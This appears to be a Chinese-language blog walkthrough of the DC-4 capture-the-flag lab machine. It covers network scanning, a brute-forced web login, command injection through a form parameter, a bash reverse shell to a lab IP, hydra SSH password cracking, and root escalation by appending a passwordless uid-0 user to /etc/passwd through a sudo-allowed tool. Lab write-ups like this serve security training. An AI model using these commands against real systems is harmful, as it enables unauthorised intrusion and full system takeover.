---
title: DC-4
author: Pp1ove
avatar: \img\custom\head.jpg
authorLink: 
authorAbout: Pplover
authorDesc: 一个好奇的人
categories: 靶机
comments: false
date: 2021-02-17 19:23:58
tags: 渗透
keywords:
description:
photos: \img\article\20.png
---

# 信息搜集

## 主机发现

```
nmap -sn 192.168.182.0/24
nmap -sS 192.168.182.144
```

![image-20210217192904630](DC-4/image-20210217192904630.png)

# getshell

打开网页发现一个登录框

![image-20210217192928366](DC-4/image-20210217192928366.png)

直接暴力破解

![image-20210217194133752](DC-4/image-20210217194133752.png)

登录成功后

![image-20210217194657969](DC-4/image-20210217194657969.png)

可以查看文件列表之类的,下main也有语句You have selected :ls -l,这里应该是可以执行命令的,抓个包看一下

![image-20210217194802726](DC-4/image-20210217194802726.png)

果然存在radio参数,可以控制我们所执行的命令

![image-20210217194843794](DC-4/image-20210217194843794.png)

那么我们反弹一个shell

```
bash+-c+'bash+-i+>%26+/dev/tcp/192.168.182.137/2333+0>%261'
```

![image-20210217195246439](DC-4/image-20210217195246439.png)

在home目录下发现jim用户,里面有个backup文件放了old-password,拿来爆破一下ssh，

```bash
hydra -l jim -P jim.txt 192.168.182.144 ssh -s 22
```

成功爆出密码

<img src="DC-4/image-20210217200831728.png" alt="image-20210217200831728" style="zoom:67%;" />

连接ssh

```
ssh jim@192.168.182.144 -p 22  
```

# 提权

使用sudo -l

![image-20210217202918701](DC-4/image-20210217202918701.png)

搜索具备suid属性的文件

```
 find / -perm -u=s -type f 2>/dev/null
```

![image-20210217202932409](DC-4/image-20210217202932409.png)

没有发现可利用的命令

查看一下目录下的文件

![image-20210217203319576](DC-4/image-20210217203319576.png)

有一封邮件，去查看一下

![image-20210217203503877](DC-4/image-20210217203503877.png)



发现了charles用户给jim用户他的密码,^xHhA&hvim0y

su charles成功登录charles用户

sudo -l

![image-20210217203946006](DC-4/image-20210217203946006.png)

发现该用户有一个root权限的命令：teehee，查看该命令的使用方法：![image-20210217204222294](DC-4/image-20210217204222294.png)

有一个-a可以对指定文件进行追加，不覆盖，测试使用

![image-20210217204723170](DC-4/image-20210217204723170.png)

然后我们就可以尝试在/etc/passwd文件下添加新的用户使这个用户具有root权限

abc::0:0:::/bin/bash

用户名：是否有密码保护：uid(root)：全称：家目录：登陆状态

![image-20210217205350099](DC-4/image-20210217205350099.png)

成功添加![image-20210217205509669](DC-4/image-20210217205509669.png)

拿到flag